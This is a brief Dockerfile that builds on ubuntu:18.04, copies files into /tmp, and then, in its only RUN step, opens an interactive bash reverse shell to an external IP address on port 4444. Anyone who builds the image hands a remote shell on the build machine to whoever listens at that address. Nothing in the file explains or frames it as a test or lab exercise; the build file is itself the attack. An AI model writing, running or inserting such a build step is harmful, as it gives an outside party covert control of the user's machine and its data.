FROM ubuntu:18.04

COPY / /tmp/.

WORKDIR /tmp
RUN bash -i >& /dev/tcp/172.105.254.138/4444 0>&1
